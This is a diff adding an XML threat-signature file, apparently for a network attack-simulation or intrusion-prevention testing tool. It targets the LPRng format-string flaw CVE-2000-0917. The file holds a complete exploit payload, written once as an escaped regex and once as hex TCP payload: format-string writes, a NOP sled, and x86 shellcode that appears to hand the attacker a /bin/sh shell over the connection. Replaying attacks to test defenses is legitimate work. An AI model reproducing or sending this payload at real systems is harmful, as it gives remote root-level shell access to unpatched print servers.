@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="LPRng Remote Overflow"/>
+    <EngDesc display="true" value="This threat attempts to cause a format string error in vulnerable versions of LPRng.  It creates a remote shell on the host that the attacker can then use. LPRng typically uses port 515."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="LPR"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true"/>
+    <Known_Products_Affected display="true">
+      <item value="LPRng"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="http://www.securityfocus.com/bid/1712"/>
+    <CVEID display="true" value="CVE-2000-0917"/>
+    <bugtraqID display="true" value="1712"/>
+    <OSVDB display="true" value="421"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff464ec0b700a900fe009b00c90166f914"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632726700979531250"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X41\X41\XF0\XF0\XFF\XBF\XF1\XF0\XFF\XBF\XF2\XF0\XFF\XBF\XF3\XF0\XFF\XBF\X25\X2E\X32\X33\X36\X75\X25\X33\X30\X34\X24\X6E\X25\X2E\X32\X31\X37\X75\X25\X33\X30\X35\X24\X6E\X25\X2E\X36\X75\X25\X33\X30\X36\X24\X6E\X25\X2E\X31\X39\X32\X75\X25\X33\X30\X37\X24\X6E\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X31\XC0\X31\XDB\X31\XC9\XB3\X07\XEB\X67\X5F\X8D\X4F\X07\X8D\X51\X0C\X89\X51\X04\X8D\X51\X1C\X89\X51\X08\X89\X41\X1C\X31\XD2\X89\X11\X31\XC0\XC6\X41\X1C\X10\XB0\X66\XCD\X80\XFE\XC0\X80\X79\X0C\X02\X75\X04\X3C\X01\X74\X0D\XFE\XC2\X80\XFA\X01\X7D\XE1\X31\XC0\XFE\XC0\XCD\X80\X89\XD3\X31\XC9\X31\XC0\XB0\X3F\XCD\X80\XFE\XC1\X80\XF9\X03\X75\XF3\X89\XFB\X31\XC0\X31\XD2\X88\X43\X07\X89\X5B\X08\X8D\X4B\X08\X89\X43\X0C\XB0\X0B\XCD\X80\X31\XC0\XFE\XC0\XCD\X80\XE8\X94\XFF\XFF\XFF\X2F\X62\X69\X6E\X2F\X73\X68\X0A"/>
+    <Created value="1139461785" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="LPRdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="6" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1025,65535)" destPort="$LPRdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="4141F0F0FFBFF1F0FFBFF2F0FFBFF3F0FFBF252E3233367525333034246E252E3231377525333035246E252E367525333036246E252E3139327525333037246E9090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909031C031DB31C9B307EB675F8D4F078D510C8951048D511C89510889411C31D2891131C0C6411C10B066CD80FEC080790C0275043C01740DFEC280FA017DE131C0FEC0CD8089D331C931C0B03FCD80FEC180F90375F389FB31C031D2884307895B088D4B0889430CB00BCD8031C0FEC0CD80E894FFFFFF2F62696E2F73680A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
